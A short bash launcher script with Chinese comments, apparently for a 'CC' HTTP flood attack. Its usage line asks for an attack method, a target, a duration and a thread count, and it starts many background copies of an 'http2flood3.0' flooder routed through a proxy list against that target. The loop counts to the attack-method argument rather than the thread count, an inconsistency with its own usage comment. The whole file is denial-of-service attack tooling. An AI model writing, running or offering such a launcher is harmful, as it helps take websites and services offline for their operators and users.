#!/bin/bash
# 用法: ./cc <攻击方式> <目标> <时间> <线程CPU几核就填几>
# 例子: ./cc GET 1.1.1.1 60 1

for n in $(seq $1); do
    ./http2flood3.0 "$2" "$3" "$4" 58 65555 16384b 131072b proxy.txt &
done
